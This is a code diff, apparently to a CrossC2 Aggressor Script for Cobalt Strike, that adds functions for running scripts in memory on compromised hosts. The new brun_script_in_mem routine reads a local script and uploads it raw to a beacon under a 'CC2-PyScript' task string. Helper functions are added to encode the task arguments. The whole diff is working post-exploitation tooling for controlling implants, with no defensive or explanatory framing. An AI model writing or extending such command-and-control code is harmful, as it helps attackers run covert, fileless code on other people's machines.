@@ -32,6 +32,17 @@ sub genTaskinfo_dyn {
     return $taskinfo;
 }
 
+sub genMemScriptInfo {
+    $scriptType = $1;
+    $scriptEngPath = $2;
+    $taskResType = $3;
+    $juicySize = $4;
+    $transportArg = $5;
+    
+    $taskinfo = "CC2-PyScript^" . $scriptType . "^". $scriptEngPath . "^" . $taskResType . "^" . $juicySize . "^" . $transportArg;
+    return $taskinfo;
+}
+
 sub transportArg {
     $arg = "";
     foreach $index => $value (@_) {
@@ -40,6 +51,34 @@ sub transportArg {
         }
     }
     return base64_encode($arg);
+}
+
+sub transportArgs {
+    $afterIndex = int($1) - 1;
+    $arg = "";
+    foreach $index => $value ($2) {
+        if ($index > $afterIndex) {
+            $arg = $arg . "^" .$value;
+        }
+    }
+    return base64_encode($arg);
+}
+
+sub transportStrings {
+    $afterIndex = int($1) - 1;
+    $arg = "";
+    $flag = 1;
+    foreach $index => $value ($2) {
+        if ($index > $afterIndex+1) {
+            if ($flag == 1) {
+                $arg = $arg.$value;
+                $flag = 0;
+            } else {
+                $arg = $arg." ".$value;
+            }
+        }
+    }
+    return $arg;
 }
 
 sub bcrossc2_load_dyn {
@@ -62,4 +101,22 @@ sub bcrossc2_load_dyn {
     }
     $ELFName = genTaskinfo_dyn($taskType, $taskName, $taskResType, $juicySize, $taskArgs);
     bupload_raw($beaconid,$ELFName,$juicyData);
+}
+
+sub brun_script_in_mem {
+    $beaconid = $1;
+    $scriptType = $2;
+    $scriptEngPath = $3;
+    $taskResType = $4;
+    $loadFileName = $5;
+    $taskArgs = base64_encode($6);
+
+    $handle = openf($loadFileName);
+    $juicyData = readb($handle, -1);
+    closef($handle);
+
+    $juicySize = lof($loadFileName);
+
+    $scriptName = genMemScriptInfo($scriptType, $scriptEngPath, $taskResType, $juicySize, $taskArgs);
+    bupload_raw($beaconid,$scriptName,$juicyData);
 }
